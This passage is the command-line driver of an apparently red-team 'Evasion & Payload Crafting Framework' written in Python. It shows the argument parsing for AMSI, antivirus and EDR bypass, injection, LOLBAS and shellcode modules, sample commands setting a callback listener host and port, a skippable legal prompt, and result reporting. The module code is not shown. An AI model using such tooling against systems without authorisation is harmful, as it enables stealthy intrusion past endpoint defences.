    console.print(f"[bold magenta]{banner}[/bold magenta]", end="")
    console.print(f"  [dim]{TOOL_NAME} v{VERSION}[/dim]")
    console.print(f"  [dim]Evasion & Payload Crafting Framework[/dim]")
    console.print(f"  [dim]MITRE ATT&CK: T1055 | T1027 | T1218 | T1562 | T1497 | T1106[/dim]")
    console.print()


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog=COMMAND,
        description=f"{TOOL_NAME} v{VERSION} — Evasion & Payload Crafting Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  ghost --modules all --target-os windows --arch x64\n"
            "  ghost --modules amsi,av,shellcode --lhost 10.10.14.5 --lport 443\n"
            "  ghost --modules edr --output report.json\n"
            "  ghost --modules lolbas,inject --target-os windows --output-dir ./engagement\n"
        )
    )
    parser.add_argument("--target-os", choices=["windows", "linux"], default="windows",
                        help="Target operating system (default: windows)")
    parser.add_argument("--arch", choices=["x86", "x64"], default="x64",
                        help="Target architecture (default: x64)")
    parser.add_argument("--modules", type=str, default="all",
                        help="Comma-separated modules: amsi,av,inject,lolbas,shellcode,edr,all (default: all)")
    parser.add_argument("--output", "-o", type=str, default=None,
                        help="Save results summary to JSON file")
    parser.add_argument("--yes", "-y", action="store_true",
                        help="Skip legal warning confirmation")
    parser.add_argument("--lhost", type=str, default="0.0.0.0",
                        help="Listener host for stagers/callbacks (default: 0.0.0.0)")
    parser.add_argument("--lport", type=int, default=4444,
                        help="Listener port for stagers/callbacks (default: 4444)")
    parser.add_argument("--iterations", type=int, default=3,
                        help="Encoding iterations for multi-layer encoding (default: 3)")
    parser.add_argument("--output-dir", type=str, default="./ghost_output",
                        help="Directory for generated artifacts (default: ./ghost_output)")
    parser.add_argument("--version", "-v", action="version", version=f"{TOOL_NAME} v{VERSION}")
    return parser


# ──────────────────────────────── Main ──────────────────────────────── #

def main():
    parser = build_parser()
    args = parser.parse_args()

    print_banner()

    # ── Legal warning ──
    if not args.yes:
        console.print(Panel(LEGAL_WARNING, title="Legal Notice", border_style="red", width=76))
        try:
            response = input("\n  Do you have authorized permission to proceed? [y/N] ").strip().lower()
            if response not in ("y", "yes"):
                console.print("\n  [red]Aborted.[/red] Obtain written authorization before using this tool.\n")
                sys.exit(0)
        except (KeyboardInterrupt, EOFError):
            console.print("\n  [red]Aborted.[/red]\n")
            sys.exit(0)

    # ── Build engagement context ──
    ctx = EngagementContext(
        target_os=args.target_os,
        arch=args.arch,
        output_dir=args.output_dir,
        lhost=args.lhost,
        lport=args.lport,
        encoding_iterations=args.iterations,
        output_file=args.output,
    )

    console.print()
    _info(f"Target OS: {ctx.target_os} | Arch: {ctx.arch}")
    _info(f"LHOST: {ctx.lhost} | LPORT: {ctx.lport}")
    _info(f"Output directory: {ctx.output_dir}")
    _info(f"Encoding iterations: {ctx.encoding_iterations}")
    console.print()

    # ── Resolve modules ──
    if args.modules.lower() == "all":
        selected = list(MODULE_MAP.keys())
    else:
        selected = [m.strip().lower() for m in args.modules.split(",")]
        invalid = [m for m in selected if m not in MODULE_MAP]
        if invalid:
            _crit(f"Unknown module(s): {', '.join(invalid)}")
            _info(f"Available modules: {', '.join(MODULE_MAP.keys())}")
            sys.exit(1)

    _info(f"Selected modules: {', '.join(selected)}")
    console.print()

    # ── Execute modules ──
    start_time = time.time()
    for mod_name in selected:
        mod_class = MODULE_MAP[mod_name]
        mod = mod_class()
        try:
            mod.run(ctx)
        except Exception as e:
            _crit(f"Module {mod_name} failed: {e}")
            ctx.results.append(AttackResult(
                module=mod_name, action="run", status="fail",
                severity="critical", notes=str(e)
            ))

    elapsed = time.time() - start_time

    # ── Summary ──
    _section("Engagement Summary")

    table = Table(title="Results", box=box.ROUNDED)
    table.add_column("Module", style="cyan")
    table.add_column("Action")
    table.add_column("Status", justify="center")
    table.add_column("Severity", justify="center")
    table.add_column("Notes")

    for r in ctx.results:
        status_color = {"ok": "green", "fail": "red", "critical": "bold red"}.get(r.status, "white")
        sev_color = {"info": "dim", "low": "green", "medium": "yellow",
                     "high": "red", "critical": "bold red"}.get(r.severity, "white")
        table.add_row(
            r.module,
            r.action,
            f"[{status_color}]{r.status.upper()}[/{status_color}]",
            f"[{sev_color}]{r.severity.upper()}[/{sev_color}]",
            r.notes[:60]
        )
    console.print(table)

    ok_count = sum(1 for r in ctx.results if r.status == "ok")
    fail_count = sum(1 for r in ctx.results if r.status == "fail")
    _info(f"Completed in {elapsed:.2f}s — {ok_count} succeeded, {fail_count} failed")
    _info(f"Artifacts saved to: {os.path.abspath(ctx.output_dir)}")

    # ── JSON output ──
    if ctx.output_file:
        output_data = {
            "tool": TOOL_NAME,
            "version": VERSION,
            "timestamp": datetime.now().isoformat(),
            "context": {
                "target_os": ctx.target_os,
                "arch": ctx.arch,
                "lhost": ctx.lhost,
                "lport": ctx.lport,
                "encoding_iterations": ctx.encoding_iterations,
            },
            "results": [
                {
                    "module": r.module,
                    "action": r.action,
                    "status": r.status,
                    "severity": r.severity,
                    "notes": r.notes,
                    "timestamp": r.timestamp,
                }
                for r in ctx.results
            ],
            "elapsed_seconds": round(elapsed, 2),
        }
        with open(ctx.output_file, "w", encoding="utf-8") as f:
            json.dump(output_data, f, indent=2)
        _ok(f"JSON report saved to {ctx.output_file}")

    console.print()


if __name__ == "__main__":
    main()
